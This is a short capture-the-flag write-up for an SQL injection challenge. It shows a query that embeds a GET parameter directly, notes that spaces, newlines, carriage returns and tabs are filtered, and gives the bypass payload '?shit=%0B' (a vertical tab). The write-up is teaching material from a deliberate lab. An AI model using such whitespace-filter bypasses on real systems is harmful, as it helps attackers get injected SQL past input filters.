---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 14
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/cf244332-a0d2-4992-a29d-c16c73b69db7)

We are provided with the SQL query:

```sql
SELECT 1234 FROM{$_GET[shit]}prob_giant WHERE 1
```

### Filter

The code filters out the following characters:

- Space 
- New line 
- Carriage return
- Tab

In order to solve the challenge, we have to separate the `FROMprob_giant`.
Since Tabs are filtered out, we have to use the Vertical tab (`%0B`) character.

```
?shit=%0B
```

SQL parsers typically treat vertical tabs as whitespace. Therefore, injecting a vertical tab (`%0B`) should be parsed as a space by the SQL engine.

The resultant query becomes:

```sql
SELECT 1234 FROM prob_giant WHERE 1
```

![2](https://github.com/Kunull/Write-ups/assets/110326359/633b9e01-cf5c-4b96-ae06-ceae467e3971)
